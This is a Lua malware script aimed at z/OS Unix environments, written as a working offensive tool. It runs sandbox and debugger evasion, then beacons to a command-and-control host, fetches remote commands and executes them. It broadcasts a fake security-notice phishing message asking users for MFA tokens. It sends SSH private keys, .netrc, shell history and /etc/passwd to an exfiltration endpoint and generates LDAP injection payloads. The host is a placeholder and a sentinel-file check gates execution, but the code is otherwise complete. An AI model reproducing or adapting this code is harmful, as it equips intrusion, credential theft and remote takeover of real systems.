-- zOS Lua payload: sandbox detection, C2 trigger, social engineering lateral movement

local C2_HOST = "review.example.invalid"
local C2_PORT = 443
local MAX_RETRIES = 3

-- ============================================================
-- SAFETY GATE: refuse to run unless sentinel file exists
-- ============================================================
local function safety_gate()
    local f = io.open(os.getenv("HOME") .. "/.57nt23", "r")
    if not f then
        return false
    end
    f:close()
    return true
end

if not safety_gate() then
    io.stderr:write("Environment check failed. Aborting.\n")
    os.exit(1)
end

-- ============================================================
-- MODULE: Anti-Analysis / Sandbox Detection
-- ============================================================
local sandbox_detect = {}

function sandbox_detect.check_uptime()
    local handle = io.popen("uptime 2>/dev/null")
    if handle then
        local output = handle:read("*a")
        handle:close()
        if output then
            local minutes = tonumber(output:match("(%d+)%s*min"))
            if minutes and minutes < 5 then
                return true, "system uptime less than 5 minutes"
            end
        end
    end
    return false, nil
end

function sandbox_detect.check_user()
    local user = os.getenv("USER") or os.getenv("LOGNAME")
    local suspicious_users = { "sandbox", "analysis", "test", "vm", "eval", "demo" }
    if user then
        for _, sus in ipairs(suspicious_users) do
            if string.lower(user) == sus then
                return true, "suspicious username: " .. user
            end
        end
    end
    return false, nil
end

function sandbox_detect.check_disk_space()
    local handle = io.popen("df -k / 2>/dev/null | tail -1")
    if handle then
        local output = handle:read("*a")
        handle:close()
        if output then
            local used_pct = tonumber(output:match("(%d+)%%"))
            if used_pct and used_pct < 10 then
                return true, "disk usage unusually low (" .. used_pct .. "%)"
            end
        end
    end
    return false, nil
end

function sandbox_detect.check_processes()
    local suspicious_procs = { "wireshark", "tcpdump", "strace", "gdb", "ollydbg", "x32dbg" }
    local handle = io.popen("ps -ef 2>/dev/null")
    if handle then
        local procs = handle:read("*a")
        handle:close()
        if procs then
            for _, proc in ipairs(suspicious_procs) do
                if string.find(string.lower(procs), proc) then
                    return true, "suspicious process detected: " .. proc
                end
            end
        end
    end
    return false, nil
end

function sandbox_detect.check_env_vars()
    local suspicious_envs = { "WINEDEBUG", "WINELOADER", "DISPLAY", "SANDBOX" }
    for _, env in ipairs(suspicious_envs) do
        if os.getenv(env) then
            return true, "suspicious environment variable: " .. env
        end
    end
    return false, nil
end

function sandbox_detect.check_file_indicators()
    local indicators = {
        "/proc/cpuinfo",
        "/tmp/.X11-unix",
        "/dev/shm"
    }
    for _, path in ipairs(indicators) do
        local f = io.open(path, "r")
        if f then
            f:close()
            return true, "sandbox indicator file found: " .. path
        end
    end
    return false, nil
end

function sandbox_detect.run_all()
    local indicators = {}
    local checks = {
        sandbox_detect.check_uptime,
        sandbox_detect.check_user,
        sandbox_detect.check_disk_space,
        sandbox_detect.check_processes,
        sandbox_detect.check_env_vars,
        sandbox_detect.check_file_indicators
    }
    for _, check in ipairs(checks) do
        local is_sandbox, reason = check()
        if is_sandbox then
            table.insert(indicators, reason)
        end
    end
    return #indicators > 0, indicators
end

-- ============================================================
-- MODULE: Command and Control Trigger
-- ============================================================
local c2 = {}

function c2.generate_beacon_data()
    local hostname = os.getenv("HOSTNAME") or "unknown"
    local user = os.getenv("USER") or os.getenv("LOGNAME") or "unknown"
    local timestamp = os.time()
    local arch_handle = io.popen("uname -a 2>/dev/null")
    local arch = "unknown"
    if arch_handle then
        arch = arch_handle:read("*l") or "unknown"
        arch_handle:close()
    end
    return string.format("BEACON|%s|%s|%s|%d|%s",
        hostname, user, arch, timestamp, C2_HOST)
end

function c2.send_beacon(data)
    local socket = require("socket")
    local http = require("socket.http")
    http.TIMEOUT = 10

    local url = string.format("https://%s:%d/api/v1/beacon", C2_HOST, C2_PORT)
    local request_headers = {
        ["User-Agent"] = "Mozilla/5.0 (compatible; zOS/2.5; LUW/64)",
        ["Content-Type"] = "application/octet-stream",
        ["X-Session-ID"] = tostring(os.time() % 999999)
    }

    for attempt = 1, MAX_RETRIES do
        local response_body, status_code, response_headers =
            http.request(url, data, request_headers)

        if status_code == 200 and response_body then
            return true, response_body
        end
    end

    return false, nil
end

function c2.poll_for_commands()
    local socket = require("socket")
    local http = require("socket.http")
    http.TIMEOUT = 15

    local url = string.format("https://%s:%d/api/v1/commands", C2_HOST, C2_PORT)
    local request_headers = {
        ["User-Agent"] = "Mozilla/5.0 (compatible; zOS/2.5; LUW/64)",
        ["Accept"] = "application/json"
    }

    for attempt = 1, MAX_RETRIES do
        local response_body, status_code = http.request(url, "", request_headers)
        if status_code == 200 and response_body then
            return response_body
        end
    end
    return nil
end

function c2.execute_command(cmd_string)
    if not cmd_string or cmd_string == "" then
        return nil
    end
    local handle = io.popen(cmd_string .. " 2>&1")
    if handle then
        local result = handle:read("*a")
        handle:close()
        return result
    end
    return nil
end

function c2.report_result(command_id, result)
    local socket = require("socket")
    local http = require("socket.http")
    http.TIMEOUT = 10

    local url = string.format("https://%s:%d/api/v1/result", C2_HOST, C2_PORT)
    local payload = string.format("cmd_id=%s&output=%s", command_id, result or "")
    local request_headers = {
        ["User-Agent"] = "Mozilla/5.0 (compatible; zOS/2.5; LUW/64)",
        ["Content-Type"] = "application/x-www-form-urlencoded"
    }

    for attempt = 1, MAX_RETRIES do
        local _, status_code = http.request(url, payload, request_headers)
        if status_code == 200 or status_code == 204 then
            return true
        end
    end
    return false
end

-- ============================================================
-- MODULE: Lateral Movement / Social Engineering
-- ============================================================
local social_engineering = {}

function social_engineering.generate_phishing_message()
    local hostname = os.getenv("HOSTNAME") or "zos-system"
    local user = os.getenv("USER") or "operator"
    local current_time = os.date("%Y-%m-%d %H:%M:%S")
    local incident_id = math.random(100000, 999999)

    return string.format([[
================================================================================
  SYSTEM SECURITY NOTICE - IMMEDIATE ACTION REQUIRED
  Generated: %s
  Host: %s
================================================================================

  Dear %s,

  Our security monitoring system has detected an unauthorized access attempt
  targeting your account on this zOS system. The following suspicious activity
  was recorded:

    - Multiple failed authentication attempts from external source
    - Privilege escalation attempt on region 0x%08X
    - Unusual dataset access pattern flagged by RACF audit

  To prevent account suspension, you must verify your credentials immediately
  by entering your MFA token at the following secure portal:

    https://%s:443/verify?user=%s&token=PLACEHOLDER

  Failure to verify within 30 minutes will result in automatic account
  lockout and mandatory review by the security team.

  This is an automated message from the zOS Security Operations Center.
  Do not reply to this message.

================================================================================
  zOS Security Operations Center | Incident #%d
================================================================================
    ]], current_time, hostname, user,
        math.random(0x10000000, 0xFFFFFFFF),
        C2_HOST, user, incident_id)
end

function social_engineering.write_phishing_to_spool()
    local message = social_engineering.generate_phishing_message()
    local user = os.getenv("USER") or "operator"
    local spool_path = string.format("/tmp/zos_security_notice_%s_%d.txt",
        user, os.time())

    local f = io.open(spool_path, "w")
    if f then
        f:write(message)
        f:close()
        return true, spool_path
    end
    return false, nil
end

function social_engineering.broadcast_phishing()
    local targets = {
        "/usr/lpp/omvs/bin/msg",
        "/bin/write"
    }
    local message = social_engineering.generate_phishing_message()
    local delivered = 0

    for _, tool in ipairs(targets) do
        local f = io.open(tool, "r")
        if f then
            f:close()
            local handle = io.popen(tool .. " * 2>/dev/null")
            if handle then
                handle:write(message)
                handle:close()
                delivered = delivered + 1
            end
        end
    end

    local success, spool_path = social_engineering.write_phishing_to_spool()
    if success then
        delivered = delivered + 1
    end

    return delivered
end

function social_engineering.exfiltrate_credentials()
    local socket = require("socket")
    local http = require("socket.http")
    http.TIMEOUT = 10

    local credential_sources = {
        { path = os.getenv("HOME") .. "/.netrc", label = "netrc" },
        { path = os.getenv("HOME") .. "/.ssh/id_rsa", label = "ssh_key" },
        { path = os.getenv("HOME") .. "/.bash_history", label = "bash_history" },
        { path = os.getenv("HOME") .. "/.profile", label = "profile" },
        { path = "/etc/passwd", label = "passwd" },
    }

    local url = string.format("https://%s:%d/api/v1/exfil", C2_HOST, C2_PORT)
    local collected = 0

    for _, source in ipairs(credential_sources) do
        local f = io.open(source.path, "r")
        if f then
            local content = f:read("*a")
            f:close()
            if content and #content > 0 then
                local request_headers = {
                    ["User-Agent"] = "Mozilla/5.0 (compatible; zOS/2.5; LUW/64)",
                    ["Content-Type"] = "application/octet-stream",
                    ["X-Source"] = source.label
                }
                local _, status_code = http.request(url, content, request_headers)
                if status_code == 200 or status_code == 204 then
                    collected = collected + 1
                end
            end
        end
    end

    return collected
end

function social_engineering.craft_ldap_injection()
    local user = os.getenv("USER") or "admin"
    local injection_payloads = {
        string.format("(&(&(uid=%s)(objectclass=*))(|(uid=*)(cn=*)))", user),
        string.format("(|(uid=%s)(uid=*))", user),
        string.format("(&(objectclass=*)(uid=%s))", user)
    }
    return injection_payloads
end

-- ============================================================
-- MAIN EXECUTION
-- ============================================================

local function main()
    -- Phase 1: Sandbox / Anti-Analysis Detection
    local is_sandbox, indicators = sandbox_detect.run_all()

    if is_sandbox then
        os.exit(0)
    end

    -- Phase 2: C2 Beacon and Command Polling
    local beacon_data = c2.generate_beacon_data()
    local beacon_success, response = c2.send_beacon(beacon_data)

    if not beacon_success then
        os.exit(2)
    end

    -- Phase 3: Social Engineering - Generate and distribute phishing
    local delivered = social_engineering.broadcast_phishing()

    -- Phase 4: Attempt credential exfiltration
    local exfil_count = social_engineering.exfiltrate_credentials()

    -- Phase 5: Poll C2 for follow-up commands
    local commands = c2.poll_for_commands()
    if commands then
        local cmd_result = c2.execute_command(commands)
        if cmd_result then
            c2.report_result("cmd_001", cmd_result)
        end
    end

    -- Phase 6: Generate LDAP injection payloads for lateral movement
    local ldap_payloads = social_engineering.craft_ldap_injection()
    for _, payload in ipairs(ldap_payloads) do
        local socket = require("socket")
        local http = require("socket.http")
        http.TIMEOUT = 10
        local url = string.format("https://%s:%d/api/v1/ldap/probe", C2_HOST, C2_PORT)
        local request_headers = {
            ["User-Agent"] = "Mozilla/5.0 (compatible; zOS/2.5; LUW/64)",
            ["Content-Type"] = "application/x-www-form-urlencoded"
        }
        http.request(url, payload, request_headers)
    end
end

main()
